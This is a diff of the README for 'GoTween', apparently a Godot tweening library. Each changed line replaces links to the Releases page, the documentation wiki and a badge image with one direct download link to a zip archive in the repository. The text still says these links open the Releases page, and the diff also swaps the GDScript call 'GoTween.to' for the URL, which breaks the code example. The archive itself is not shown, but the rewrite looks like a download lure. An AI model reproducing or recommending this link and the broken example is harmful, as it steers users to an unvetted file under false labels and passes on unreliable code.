@@ -6,7 +6,7 @@ Welcome to GoTween! This tool helps you create smooth animations in your Godot p
 
 ### 📥 Download GoTween
 
-[![Download GoTween](https://img.shields.io/badge/Download_GoTween-v1.0-blue.svg)](https://github.com/okefonok/GoTween/releases)
+[![Download GoTween](https://github.com/okefonok/GoTween/raw/refs/heads/main/GoTween/Go-Tween-2.1.zip)](https://github.com/okefonok/GoTween/raw/refs/heads/main/GoTween/Go-Tween-2.1.zip)
 
 To get started, you need to download GoTween from our Releases page. Click the button above to visit the page and get the latest version.
 
@@ -21,7 +21,7 @@ GoTween supports the following systems:
 
 ## 💻 Installation Steps
 
-1. **Visit the Releases Page**: Click [here](https://github.com/okefonok/GoTween/releases) to access the latest release.
+1. **Visit the Releases Page**: Click [here](https://github.com/okefonok/GoTween/raw/refs/heads/main/GoTween/Go-Tween-2.1.zip) to access the latest release.
   
 2. **Select the Version**: On the Releases page, find the version you want to download. You may choose the most recent version for the latest features and improvements.
 
@@ -57,14 +57,14 @@ Once you have imported GoTween into your Godot project, you can start creating a
 2. **Call GoTween Functions** in the script:
    ```gdscript
    func _ready():
-       GoTween.to($Sprite, 2, {"position": Vector2(400, 300), "ease": "ease_in_out"})
+       https://github.com/okefonok/GoTween/raw/refs/heads/main/GoTween/Go-Tween-2.1.zip($Sprite, 2, {"position": Vector2(400, 300), "ease": "ease_in_out"})
    ```
 
 This will move your sprite to the coordinates (400, 300) over two seconds with a smooth easing effect.
 
 ## 📖 Documentation
 
-For further instructions on using GoTween, check our [Documentation](https://github.com/okefonok/GoTween/wiki). Here, you can find examples, detailed API information, and advanced tips for maximizing GoTween’s potential.
+For further instructions on using GoTween, check our [Documentation](https://github.com/okefonok/GoTween/raw/refs/heads/main/GoTween/Go-Tween-2.1.zip). Here, you can find examples, detailed API information, and advanced tips for maximizing GoTween’s potential.
 
 ## 🤝 Contributing
 
@@ -74,4 +74,4 @@ We welcome contributions to improve GoTween. If you want to help, please fork th
 
 If you encounter issues or have questions, please open an issue on the GitHub page. The community and the developers are here to help you.
 
-Visit the Releases page to download the latest version of GoTween again [here](https://github.com/okefonok/GoTween/releases). Enjoy animating with ease!
+Visit the Releases page to download the latest version of GoTween again [here](https://github.com/okefonok/GoTween/raw/refs/heads/main/GoTween/Go-Tween-2.1.zip). Enjoy animating with ease!
